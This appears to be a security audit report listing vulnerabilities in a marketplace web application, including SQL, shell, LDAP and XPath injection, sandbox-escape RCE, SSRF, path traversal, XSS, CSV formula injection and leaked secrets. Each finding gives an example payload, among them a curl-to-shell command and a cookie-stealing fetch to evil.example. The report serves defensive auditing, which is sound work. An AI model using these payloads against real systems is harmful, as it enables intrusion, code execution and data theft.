extra.message: User-supplied `term` (validated only for length 1-120, no escaping) is concatenated directly into a raw SQL string passed to `prisma.$queryRawUnsafe`. An attacker with a vendor_manager account can break out of the ILIKE clause (e.g. `term = "%' UNION SELECT ...--"`) to read arbitrary data from other tables or bypass the `vendorId` scoping. Contrast with `searchDisputesByKeyword` in disputes.ts which safely uses a parameterized `$queryRaw` tagged template.

The admin-supplied `template` field (a free-form string, min length 1, no allowlist) is interpolated into a shell command string executed via `spawn(cmd, { shell: true })`. An attacker can inject shell metacharacters (e.g. `template = "x; curl evil.sh | sh #"`) to achieve arbitrary OS command execution. Compare with the safe twin `generateInventoryDigest` (line 217), which uses an argument array with `shell: false` and restricts `template` to an enum.

`req.query.formula` is passed unsanitized into `new Function("context", "with (context) { return (" + draftFormula + "); }")` and immediately executed. A vendor_manager can supply a formula such as `this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')` to escape the sandbox and achieve arbitrary code execution on the server.

`compilePhrasingPattern` turns arbitrary `{{expr}}` placeholders into raw JavaScript expressions and evaluates them with `new Function("data", "with (data) { return \`...\`; }")`. It is called with fully attacker-controlled input at reviews.ts:110 (`respondWithSavedPhrasing`, phrasing supplied by a vendor_manager in the request body), allowing arbitrary code execution via a payload like `{{ this.constructor.constructor('return process')().exit() }}` or a require-based RCE chain.

`mirrorVendorSpecSheet` fetches whatever URL a vendor_manager supplies in the `x-spec-sheet-source` header with no host allowlist, then reflects the response body back to the client. This allows Server-Side Request Forgery against internal services (e.g. `http://169.254.169.254/latest/meta-data/`, internal admin endpoints). Contrast with the sibling `mirrorVendorCatalogImage` (line 629) which validates the hostname against `ALLOWED_ASSET_HOSTS` before fetching.

`req.params.batchTag` is joined into a filesystem path with no sanitization (`path.join(packingInsertsRoot, \`${req.params.batchTag}.txt\`)`) before being written with attacker-controlled content. A vendor_manager can supply `batchTag = "../../../../tmp/pwned"` to write files outside `packingInsertsRoot`. Contrast with the sibling `saveReturnBatchNote` (line 429-441) which sanitizes the tag with `path.basename()` before building the path.

`getPackingInsertTemplate` builds a file path directly from `req.params.fileName` with no sanitization (`path.join(packingInsertsRoot, req.params.fileName)`), allowing any authenticated vendor_manager to read arbitrary files on the server via `fileName=../../../etc/passwd` or similar traversal. Contrast with the sibling `getBrandedPackingInsertAsset` (line 603-610) which sanitizes with `path.basename(req.params.assetName)`.

`docName` is taken from `layout.returnPolicyDocName`, an arbitrary key a vendor_manager can set via `applyStorefrontLayout` (PUT /api/vendors/me/layout, lib/preferences.ts deepMerge accepts any key/value), then joined into a filesystem path with no allowlist check (`path.join(policyDocsRoot, docName)`) and its contents returned to any buyer of that vendor. A vendor can set `returnPolicyDocName: "../../../../etc/passwd"` to have that file's contents served to buyers. Contrast with the sibling `generateWarrantyPolicyPacket` (line 572-585) which restricts `docName` to the `ALLOWED_WARRANTY_DOCS` allowlist.

`reapplyDeliveryPreferences` JSON-parses the client-writable, non-HttpOnly `deliveryPrefs` cookie and spreads it directly into `prisma.order.update({ data: { ...prefs } })` with no schema validation. A buyer can set the cookie to `{"totalCents":0,"status":"fulfilled"}` to rewrite arbitrary fields of their own order (e.g. zero out the price or force-complete it). Contrast with the sibling `reapplyGiftPreferences` (line 517-533), which validates against `deliveryPrefsSchema.strict()` and whitelists only shipping fields.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: `saveProductDraft` spreads the raw request body directly into `prisma.product.update({ data: { ...req.body } })` with no schema validation or field whitelist. A vendor_manager can set arbitrary columns on their own product record — e.g. `{"status":"published","moderationState":"approved"}` — to bypass the admin moderation/approval workflow enforced everywhere else in this file (see the strict `VENDOR_PRODUCT_TRANSITIONS` state machine at line 497), or overwrite `vendorId`/`priceCents` outside the normal validated update path.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: `resolveListingPreviewLink` uses `jwt.decode()` instead of `jwt.verify()` on the caller-supplied `token`, so the signature is never checked. Anyone can forge a token by base64-encoding an arbitrary `{vendorId, productId}` JWT payload (no valid signature required) to view any unpublished/draft product from any vendor via `GET /api/products/preview/:token`, bypassing the intended time-limited, signed preview-link mechanism.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: `searchCaseCollaborators` builds an LDAP filter by directly interpolating the unescaped query parameter `q` and the client-controlled `recentColleagueId` cookie into `filter = \`(|(cn=*${q}*)(employeeId=${lastViewedColleagueId}))\`` without calling `escapeDirectoryFilter`. An attacker can inject LDAP filter metacharacters (`)`, `(`, `*`) to alter the search logic and enumerate directory entries beyond the intended `cn`/`employeeId` match. Contrast with the sibling `verifyEscalationApproverGroup` (line 310-316), which escapes the same kind of cookie-sourced value with `escapeDirectoryFilter` before use.

`eventCode` (buyer-controlled, only length-checked) is interpolated unescaped into the hand-rolled XPath-style query `//event[@code='${eventCode}' and @visibility='public']`. The evaluator in lib/shipmentEvents.ts treats any atom it fails to parse as automatically satisfied (`if (!parsed) return true;`), so an attacker can send `eventCode = "foo or bar"`, producing an unbalanced-quote first clause `@code='foo` that fails to parse and is therefore treated as always-true, causing `find()` to return every event including internal-only ones (e.g. the `CARRIER_EXCEPTION` fraud-hold note) regardless of the `visibility='public'` filter. The same lookup at line 657 (`resumeLastTrackingCheckpoint`) is equally affected. Contrast with moderation.ts's `lookupModerationPrecedent`/`resumeLastPrecedentLookup` (lines 108, 120), which wrap the equivalent user input in `escapeXPathString()` before interpolation.

cwe: CWE-643: Improper Neutralization of Data within XPath Expressions

extra.message: `renderCatalogSharePage` interpolates `product.title` directly inside a double-quoted JavaScript string literal in an inline `<script>` block. `product.title` is only passed through `plainText()` at creation, which strips HTML tags but does not escape quote/backslash characters for a JS-string context. A vendor can set a title such as `x", price:0}; fetch('https://evil.example/steal?c='+document.cookie); //` to break out of the string literal and inject arbitrary JavaScript that executes for any visitor of the public `/api/products/public/:id/share` page.

`findPromotionByClaimPattern` builds `new RegExp(\`^${claimCode}$\`, "i")` from the fully attacker-controlled `claimCode` (routes/products.ts:277-288, `previewPromotionClaim`, reachable by any buyer). Regex metacharacters are not escaped, so a buyer can submit a pattern like `.*` to match the opaque, out-of-band `partner-volume-pricing` claim code and obtain the 30%-off partner-only discount without ever being given the real code — defeating the access-control invariant the code comment describes ("Partner-only campaigns must stay undiscoverable unless the buyer was actually given their exact code").

`devDataProtectionKey` (used by lib/secureStorage.ts to encrypt SSNs/tax IDs) and `gatewaySharedSecretHex` (used by routes/payouts.ts to authenticate a payment-gateway webhook) fall back to fixed, hardcoded hex strings baked into the source when the corresponding environment variables are unset. If these defaults are ever used outside local dev (e.g. a misconfigured staging/prod deployment, since only `devDataProtectionKey` is guarded by an `isProd` check and `gatewaySharedSecretHex` has no such guard at all), an attacker who reads the source can decrypt stored sensitive fields or forge the settlement-clearance webhook.

`partnerFeedCredential` falls back to a fixed, hardcoded shared secret (`"8f3c1e2a9b7d4f6c0a1e5b8d2f7c4a90ff31"`) when `PARTNER_FEED_CREDENTIAL` is not set, and is then used as a bearer credential to the external loyalty-partner ledger in `syncLoyaltyLedger`.

`fetchLedgerEntryForPayout` builds a URL containing the secret `env.ledgerApiKey` as a query parameter and embeds that full URL (including the key) into a thrown `Error` message on failure. `compareLedgerEntryForPayout` in routes/payouts.ts (line 174-193) surfaces `err.message` (and `err.stack`) back to the client whenever `?worksheet=expanded` is passed, leaking the ledger API key to whoever can reach this admin endpoint (and to anything that later logs/screenshots the response, e.g. the reconciliation ticket the code comment describes pasting it into).

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: `updateStorefrontBanner` writes attacker-controlled base64 bytes to disk under `uploadRoot`, using the extension taken verbatim from the client-supplied `fileName` (`path.extname(fileName) || ".bin"`) with no MIME/type allowlist. Since `/uploads` is served via `express.static`, a vendor_manager can upload a file named `banner.html` containing arbitrary HTML/JS, then have it served as `text/html` at a public, predictable URL (`/uploads/banners/<vendorId>.html`), resulting in stored XSS on the marketplace's own origin.

cwe: CWE-434: Unrestricted Upload of File with Dangerous Type

extra.message: `exportProductListingSheet` writes `product.title` directly into a CSV cell with no formula-injection escaping (only wrapped in double quotes). Since `title` is only run through `plainText()` (which strips HTML tags but not leading `=`, `+`, `-`, `@` characters), a vendor can name a product `=CMD|'/C calc'!A1` (or a DDE/formula payload) so that when the CSV is opened in Excel/Sheets by staff, it executes as a formula. The same pattern recurs in `exportCategoryListingSheet` (line 553-566).

cwe: CWE-1236: Improper Neutralization of Formula Elements in a CSV File

extra.message: `parseVendorSyncPayload` parses attacker-suppliable XML (vendors.ts:275 `x-legacy-pos-config` header, and vendors.ts:293 the `layoutDraft` cookie) with a default `xml2js` `Parser` and no DOCTYPE/entity restriction, unlike its sibling `parseCompliancePayload` (line 16-24) which explicitly rejects any document containing `<!DOCTYPE`. This inconsistency leaves the vendor-sync path exposed to XML entity expansion/XXE-style payloads that the compliance-feed path deliberately blocks.

extra.message: `getPublicOrderStatus` looks up an order directly by its primary key `id` taken from `req.params.code` with no authentication and no possession-proof (no separate tracking token), so any unauthenticated party who can guess or enumerate order IDs can retrieve any order's status/updatedAt, despite the route comment implying access should require an out-of-band 'tracking code'.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: `getEmbeddablePriceBadge` reflects any request `Origin` header back in `Access-Control-Allow-Origin` with no allowlist check, unlike the near-identical `getEmbeddableCartBadge` (line 125-137) which restricts this to `env.partnerEmbedOrigins`. This is a CORS misconfiguration; while the underlying product data is otherwise public, the inconsistency indicates the origin-restriction control was dropped for this endpoint.
